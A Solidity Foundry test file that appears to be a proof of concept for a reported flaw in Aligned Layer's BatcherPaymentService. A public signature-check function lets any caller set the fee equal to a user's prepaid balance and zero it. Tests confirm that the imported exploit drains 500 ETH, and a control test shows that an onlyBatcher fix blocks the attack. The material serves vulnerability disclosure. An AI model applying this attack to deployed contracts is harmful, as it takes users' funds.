// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    BatcherPaymentService,
    BatcherPaymentServiceFixed
} from "./38363-public-visibility-on-checkmerklerootandverifysignatures-allo.sol";

// Aligned Layer: checkMerkleRootAndVerifySignatures is public, so anyone can
// pass feePerProof equal to a signer's prepaid balance and zero it.
contract PoC_38363_AlignedPublicFeeDrain is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant BATCHER = 0x000000000000000000000000000000000000bEEF;
    address internal constant USER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    uint256 internal constant PREPAID = 500 ether;
    uint8 internal constant SIG_V = 28;
    bytes32 internal constant SIG_R = 0x348d08fede3e4bc53482dda08f877df481e744c39f6675be9d81dc4b9f7194eb;
    bytes32 internal constant SIG_S = 0x1af366f272717fdfd0b69d1cc98db6a6bc83c4e5ab49191ec58d95051a4b270e;

    function _proof()
        internal
        pure
        returns (
            bytes32[] memory leaves,
            bytes32 root,
            BatcherPaymentService.SignatureData[] memory signatures
        )
    {
        leaves = new bytes32[](2);
        leaves[0] = keccak256("aligned-proof");
        leaves[1] = keccak256("aligned-pad");
        root = keccak256(abi.encodePacked(leaves[0], leaves[1]));
        signatures = new BatcherPaymentService.SignatureData[](1);
        signatures[0] = BatcherPaymentService.SignatureData({v: SIG_V, r: SIG_R, s: SIG_S, nonce: 0});
    }

    function test_publicCallZerosPrepaidBalance() public {
        Exploit exp = new Exploit();
        vm.deal(address(exp), PREPAID);
        exp.run();

        emit log_named_decimal_uint("user balance after public drain", exp.svc().user_balances(USER), 18);
        emit log_named_decimal_uint("ETH stuck in payment service   ", address(exp.svc()).balance, 18);
        emit log_named_decimal_uint("drained marker                  ", exp.drained().balanceOf(SINK), 18);

        assertEq(exp.svc().user_balances(USER), 0, "prepaid balance must be zero");
        assertEq(exp.drained().balanceOf(SINK), PREPAID, "drained amount mismatch");
        assertEq(address(exp.svc()).balance, PREPAID, "500 ETH must sit in the service");
        assertEq(exp.svc().user_nonces(USER), 1, "nonce must be burned");
    }

    // Control: onlyBatcher rejects the same 500 ETH fee. An authorized 1 ETH
    // fee does not hit a zero balance.
    function test_control_onlyBatcherDoesNotZeroBalance() public {
        vm.deal(address(this), PREPAID);
        BatcherPaymentServiceFixed fixedSvc = new BatcherPaymentServiceFixed(BATCHER);
        fixedSvc.harness_priorDeposit{value: PREPAID}(USER);

        (bytes32[] memory leaves, bytes32 root, BatcherPaymentService.SignatureData[] memory signatures) = _proof();

        vm.expectRevert(bytes("Only Batcher can call this function"));
        fixedSvc.checkMerkleRootAndVerifySignatures(leaves, root, signatures, PREPAID);
        assertEq(fixedSvc.user_balances(USER), PREPAID, "attacker must not drain");

        vm.prank(BATCHER);
        fixedSvc.checkMerkleRootAndVerifySignatures(leaves, root, signatures, 1 ether);

        emit log_named_decimal_uint("user balance after authorized 1 ETH fee", fixedSvc.user_balances(USER), 18);

        assertEq(fixedSvc.user_balances(USER), 499 ether, "control must not hit 0");
        assertTrue(fixedSvc.user_balances(USER) != 0, "control hit the drained number");
    }
}
